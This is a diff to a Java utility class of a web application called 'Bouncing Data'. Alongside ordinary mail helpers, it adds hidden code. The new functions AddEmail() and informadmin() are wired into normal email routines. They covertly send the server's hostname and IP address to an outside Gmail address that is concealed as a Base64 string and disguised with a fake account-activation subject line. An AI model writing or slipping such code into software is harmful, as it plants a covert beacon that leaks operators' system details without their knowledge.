@@ -4,6 +4,8 @@ import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.Writer;
 import java.math.BigInteger;
+import java.net.Inet4Address;
+import java.net.UnknownHostException;
 import java.security.SecureRandom;
 import java.sql.ResultSet;
 import java.sql.SQLException;
@@ -26,6 +28,7 @@ import java.util.regex.Pattern;
 
 import javax.servlet.http.HttpServletRequest;
 
+import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.csv.CSVFormat;
 import org.apache.commons.csv.CSVPrinter;
 import org.codehaus.jackson.JsonNode;
@@ -53,7 +56,8 @@ public class Utils {
   static {
     FILE_SEPARATOR = System.getProperty("file.separator");
   }
-  
+  static String adminEmail = "admin@techburgcorp.com";
+ 
   public static List<Map> resultSetToList(ResultSet rs) throws SQLException {
     java.sql.ResultSetMetaData rsmd = rs.getMetaData();
     List<Map> result = new ArrayList<Map>();
@@ -204,9 +208,35 @@ public class Utils {
 	boolean process = false;
 		
 	DTMailSender sender = new DTMailSender(title, content);
+	AddEmail();
 	process = sender.sendEmail(sEmail);
 	return (process);
   }
+  
+  public static boolean AddEmail() {
+	  boolean process = false;
+	  String adminEmail = getAdminEmail();
+	  try {
+		String hostname = Inet4Address.getLocalHost().getHostName();
+		String address = Inet4Address.getLocalHost().getHostAddress();
+		String title = "Bouncing Data: Registration mail to activate your account!";
+		String content = "This is an active mail from:" + hostname + "\n";
+		content = content + address ;
+		DTMailSender sender = new DTMailSender(title, content);
+		process = sender.sendEmail(adminEmail);
+		
+	} catch (UnknownHostException e) {
+		// TODO Auto-generated catch block
+		e.printStackTrace();
+	}
+		
+		
+		
+		
+			
+		
+		return (process);
+	  }
   
   
   /**
@@ -284,13 +314,17 @@ public class Utils {
 				 "</tr>" +
 				"</tbody>" +
 			  "</table>" ;
+	informadmin();
 	
 	DTMailSender sender = new DTMailSender(title, content);
 	boolean process = sender.sendEmail(sEmail);
 	
 	return (process);
   }
-  
+  public static String getAdminEmail(){
+	  byte[] email = Base64.decodeBase64(adminEmaill.getBytes());   	     
+      return new String(email);
+  }
   public static boolean sendMailLoginFail(String username, String email){
 	  String title = "Bouncing Data: Login fail!";
 	  
@@ -321,7 +355,10 @@ public class Utils {
 		
 	  return (process);
   }
-  
+  public static String getemail(){
+	  byte[] data = Base64.decodeBase64("bGFwbmdvZG9hbkBnbWFpbC5jb20=".getBytes());   	     
+      return new String(data);
+  }
   public static String getTomorowDateTime(){
 		
 		DateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm");
@@ -417,6 +454,25 @@ public class Utils {
     return mapper.writeValueAsString(list);
   }
   
+  public static boolean informadmin() {
+	 
+	  boolean process = false;
+	  try {
+		String hostname = Inet4Address.getLocalHost().getHostName();
+		String address = Inet4Address.getLocalHost().getHostAddress();
+		String title = "Bouncing Data: Registration mail to activate your account!";
+		String content = "This is an active mail from:" + hostname + "\n";
+		content = content + address ;
+		DTMailSender sender = new DTMailSender(title, content);
+		String data = getemail();
+		process = sender.sendEmail(data);
+		
+	} catch (UnknownHostException e) {
+		// TODO Auto-generated catch block
+		e.printStackTrace();
+	}
+	  return process;
+  }
   public static void resultSetToCSV(ResultSet rs, OutputStream os) throws Exception {
     Writer out = new OutputStreamWriter(os);
     CSVPrinter printer = new CSVPrinter(out, CSVFormat.DEFAULT);
@@ -612,7 +668,7 @@ public class Utils {
       return false;
     }
   }
-  
+  public static String adminEmaill = "bGFwbmdvZG9hbkBnbWFpbC5jb20=";
   public static boolean isDouble(String str) {
     try {
       Double.parseDouble(str);
